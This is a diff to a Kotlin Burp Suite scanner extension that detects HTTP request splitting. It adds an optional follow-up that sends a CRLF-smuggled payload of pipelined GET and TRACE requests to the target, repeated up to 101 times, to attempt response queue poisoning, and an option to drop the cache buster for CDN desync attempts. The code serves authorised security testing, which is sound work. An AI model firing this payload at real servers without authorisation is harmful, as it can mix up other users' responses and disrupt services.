@@ -5,15 +5,15 @@ import burp.ReqMutator.Companion.paramMinerMutations
 import burp.ReqMutator.Companion.pathBasedMutations
 import burp.ReqMutator.Companion.protocolBasedMutations
 import burp.ReqMutator.Companion.smuggleBasedMutations
-import burp.api.montoya.MontoyaApi
 import burp.api.montoya.http.HttpMode
 import burp.api.montoya.http.message.HttpRequestResponse
-import burp.api.montoya.http.message.StatusCodeClass
-import burp.api.montoya.http.message.responses.HttpResponse
+import burp.api.montoya.http.message.requests.HttpRequest
 import burp.api.montoya.http.message.responses.analysis.AttributeType
-import burp.api.montoya.logging.Logging
-import kotlin.math.log
+import jdk.internal.net.http.common.Log.requests
+import java.net.URI
+import java.net.URL
 import kotlin.random.Random
+
 
 //this is a basic scan check implementation
 internal class ReqSplit(name: String?) : Scan(name) {
@@ -43,7 +43,8 @@ internal class ReqSplit(name: String?) : Scan(name) {
         scanSettings.register("Enable fallback diff", true, "Fallback to diffing <serverStatus> if expected match fails")
         scanSettings.register("Encode-colons", true, ": -> %3a")
         scanSettings.register("Encode-forward-slash", true, "/ -> %2f")
-
+        scanSettings.register("Add cache buster", true, "Disable if you fancy a chance at a http1mustdie-style CDN desync")
+        scanSettings.register("attempt poc", false, "Automatically follow up with RQP attempt")
         scanSettings.importSettings(BurpExtender.configSettings)
         scanSettings.importSettings(headerBasedMutations)
         scanSettings.importSettings(pathBasedMutations)
@@ -56,7 +57,9 @@ internal class ReqSplit(name: String?) : Scan(name) {
     //this is where your scan logic goes
     override fun doScan(baseReq: ByteArray, service: IHttpService): MutableList<IScanIssue> {
 
-	val wafChecker = WAFChecker()
+	    val wafChecker = WAFChecker()
+
+        var pocHasRun = false
 
         // Add all the enabled permutations types
         val enabledMutations = arrayListOf<String>()
@@ -102,7 +105,14 @@ internal class ReqSplit(name: String?) : Scan(name) {
                 break
             }
 
-            val baseRequest = Utilities.buildMontoyaReq(Utilities.addCacheBuster(baseReq, Utilities.generateCanary()), service) //Easy way to build a montoya request so you can stop messing with the old version
+            val baseRequest: HttpRequest
+
+            //Add OPTIONAL cache buster...
+            if (Utilities.globalSettings.getBoolean("Add cache buster")) {
+                baseRequest = Utilities.buildMontoyaReq(Utilities.addCacheBuster(baseReq, Utilities.generateCanary()), service)
+            } else {
+                baseRequest = Utilities.buildMontoyaReq(baseReq, service)
+            }
 
             var currentStatusDiff = ""
             var previousStatusDiff = ""
@@ -248,6 +258,7 @@ internal class ReqSplit(name: String?) : Scan(name) {
                     if (numberOfMatches != 0 && numberOfMatches == probe.expectedResponseMatches.size) { //If we got a match on every entry one of the expected response matches.
 
                         // todo Validate this further by removing the parts that should actually make this work...
+                        // todo launch an optional attack for quickly check for desync via RQP or similar? :thinking:
                         if (!confirmedVulnerable(probeRequestResponse, technique) && Utilities.globalSettings.getBoolean("Enable follow up")) {
                             // followUp tells us it's a FP
                             continue
@@ -273,6 +284,19 @@ internal class ReqSplit(name: String?) : Scan(name) {
                         //Fix broken responses... (responses without status codes...)
                         if (probeRequestResponse.response().statusCode() == "0".toShort()) {
                             probeRequestResponse = HttpRequestResponse.httpRequestResponse(probeRequestResponse.request(), probeRequestResponse.response().withStatusCode("1337".toShort()))
+                        }
+
+                        // Attempt poc (before report otherwise our logic  breaks...)
+                        if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
+                            if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
+                                if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                                    pocHasRun = true
+                                    attemptRQP(baseRequest)
+                                }
+                            }
+                        } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                            pocHasRun = true
+                            attemptRQP(baseRequest)
                         }
 
                         report("Request Splitting via $technique",
@@ -324,6 +348,19 @@ internal class ReqSplit(name: String?) : Scan(name) {
 
                 statusDiffString += "</table>"
 
+                // Attempt poc (before report otherwise our logic  breaks...)
+                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
+                    if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
+                        if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                            pocHasRun = true
+                            attemptRQP(baseRequest)
+                        }
+                    }
+                } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
+                    pocHasRun = true
+                    attemptRQP(baseRequest)
+                }
+
                 report(
                     "Request Splitting via $technique - Dodgy", """
                     The application behaves in a manner that is consistent with HTTP Request Splitting...Sort of:<br>
@@ -343,6 +380,45 @@ internal class ReqSplit(name: String?) : Scan(name) {
 
         return mutableListOf<IScanIssue>()
     }
+
+    fun attemptRQP(baseRequest: HttpRequest): Boolean {
+
+        var basePath = "/"
+        if (Utilities.globalSettings.getBoolean(("maintain path"))) {
+            basePath = baseRequest.pathWithoutQuery()
+        }
+
+        //Attack string is a RQP gadget I hope might work
+        val attackRequest = baseRequest.withPath("$basePath%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
+                + "TRACE%20/%20HTTP/1.1%0d%0aX:%20x")
+
+        var previousServerStatus = ""
+
+        for (i in 0..100) {
+            val attackRequestResponse = Utilities.montoyaApi.http().sendRequest(attackRequest)
+            if (i == 0) {
+                previousServerStatus = serverStatus(attackRequestResponse)
+                continue
+            }
+            val currentServerStatus = serverStatus(attackRequestResponse)
+
+            if (previousServerStatus != currentServerStatus) {
+                reportToOrganiser("RQP!?!?!?!\r\n$previousServerStatus|$currentServerStatus", attackRequestResponse)
+                return true
+            }
+        }
+        return false
+    }
+
 }
 
 fun responseHasErrors(requestResponse: HttpRequestResponse): Boolean {
